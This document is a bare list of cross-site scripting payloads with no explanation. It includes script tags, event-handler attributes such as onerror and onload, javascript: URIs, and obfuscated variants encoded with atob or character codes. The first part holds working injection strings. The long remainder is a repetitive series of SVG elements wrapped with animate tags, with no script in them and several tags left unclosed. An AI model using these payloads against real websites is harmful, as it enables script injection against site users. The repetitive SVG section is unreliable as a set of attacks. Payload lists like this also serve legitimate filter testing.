<script>alert(1)</script>
<img src=x onerror=alert(1)>
javascript:alert(1)
<svg/onload=alert(1)>
<body onload=alert(1)>
<iframe src=javascript:alert(1)>
<marquee onstart=alert(1)>
<details ontoggle=alert(1)>
<svg><script>alert(1)</script></svg>
<img src=1 onerror=alert(1)>
<img src='1' onerror='alert(1)'>
<img src="1" onerror="alert(1)">
<div onmouseover="alert(1)">Hover me</div>
<input onfocus=alert(1) autofocus>
<video src=1 onerror=alert(1)>
<audio src=1 onerror=alert(1)>
<math><mtext><div onmouseover='alert(1)'>
<form><button formaction=javascript:alert(1)>
<isindex type=image src=1 onerror=alert(1)>
<object data=javascript:alert(1)>
<svg><script xlink:href=,alert(1)></script></svg>
<embed src=javascript:alert(1)>
<a href=javascript:alert(1)>Click me</a>
<img src=1 onerror=eval(atob('YWxlcnQoMSk='))>
<img src=1 onerror=eval(String.fromCharCode(97,108,101,114,116,40,49,41))>
<img src=1 onerror=this.src='javascript:alert(1)'>
<img src=1 onerror=location='javascript:alert(1)'>
<img src=1 onerror=import('javascript:alert(1)')>
<img src=1 onerror=fetch('javascript:alert(1)')>
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x attributetype=xml dur=1s>
<svg><animate onend=alert(1) attributeName=x dur=1s>
<svg><set onend=alert(1) attributename=x attributetype=xml dur=1s>
<svg><animate onrepeat=alert(1) attributeName=x dur=1s repeatcount=2>
<svg><set onrepeat=alert(1) attributename=x attributetype=xml dur=1s repeatcount=2>
<svg><a><circle r=40 fill=red><animate attributeName=fill values=blue;red;green dur=1s repeatcount=indefinite></a>
<svg><a><glyph><tspan>Hello</tspan></glyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><missing-glyph><tspan>Hello</tspan></missing-glyph><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><hkern><tspan>Hello</tspan></hkern><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><vkern><tspan>Hello</tspan></vkern><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><metadata><tspan>Hello</tspan></metadata><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><desc><tspan>Hello</tspan></desc><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><title><tspan>Hello</tspan></title><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><script><tspan>Hello</tspan></script><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><style><tspan>Hello</tspan></style><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><view><tspan>Hello</tspan></view><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><filter><tspan>Hello</tspan></filter><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feblend><tspan>Hello</tspan></feblend><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fecolormatrix><tspan>Hello</tspan></fecolormatrix><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fecomponenttransfer><tspan>Hello</tspan></fecomponenttransfer><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fecomposite><tspan>Hello</tspan></fecomposite><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feconvolvematrix><tspan>Hello</tspan></feconvolvematrix><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fediffuselighting><tspan>Hello</tspan></fediffuselighting><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fedisplacementmap><tspan>Hello</tspan></fedisplacementmap><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fedistantlight><tspan>Hello</tspan></fedistantlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feflood><tspan>Hello</tspan></feflood><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fefunca><tspan>Hello</tspan></fefunca><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fegaussianblur><tspan>Hello</tspan></fegaussianblur><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feimage><tspan>Hello</tspan></feimage><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><femerge><tspan>Hello</tspan></femerge><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><femorphology><tspan>Hello</tspan></femorphology><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feoffset><tspan>Hello</tspan></feoffset><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fepointlight><tspan>Hello</tspan></fepointlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fespecularlighting><tspan>Hello</tspan></fespecularlighting><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fespotlight><tspan>Hello</tspan></fespotlight><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><fetile><tspan>Hello</tspan></fetile><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><feturbulence><tspan>Hello</tspan></feturbulence><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><animatecolor><tspan>Hello</tspan></animatecolor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><animatemotion><tspan>Hello</tspan></animatemotion><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><animatetransform><tspan>Hello</tspan></animatetransform><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><mpath><tspan>Hello</tspan></mpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><set><tspan>Hello</tspan></set><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><animate><tspan>Hello</tspan></animate><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><discard><tspan>Hello</tspan></discard><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><hatch><tspan>Hello</tspan></hatch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><hatchpath><tspan>Hello</tspan></hatchpath><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><mesh><tspan>Hello</tspan></mesh><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><meshgradient><tspan>Hello</tspan></meshgradient><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><meshpatch><tspan>Hello</tspan></meshpatch><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><meshrow><tspan>Hello</tspan></meshrow><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
<svg><a><solidcolor><tspan>Hello</tspan></solidcolor><animate attributeName=x values=20;100;20 dur=1s repeatcount=indefinite></a>
